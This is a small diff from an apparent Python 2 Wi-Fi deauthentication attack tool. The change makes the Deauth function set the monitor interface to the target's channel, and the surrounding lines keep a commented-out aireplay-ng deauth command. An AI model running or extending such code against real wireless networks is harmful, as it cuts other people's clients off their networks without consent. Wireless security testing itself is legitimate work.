@@ -251,7 +251,7 @@ def Deauth(Dbssid,Dssid,Dchannel,Dtime):
 	#print "after airmon\n"
 	# mon_iface = get_moniface()
 	mon_iface = "mon0"
-	call(["iw","dev","mon0","set","channel","1"])
+	call(["iw","dev",mon_iface,"set","channel",Dchannel])
 	#print mon_iface
 	print bcolors.OKBLUE + "\nAttack time set to: {} Seconds\n".format(Dtime) + bcolors.ENDC
 	# aireplay = Popen(["aireplay-ng", "--deauth", "0",  "-a", Dbssid, "-e", Dssid, mon_iface])
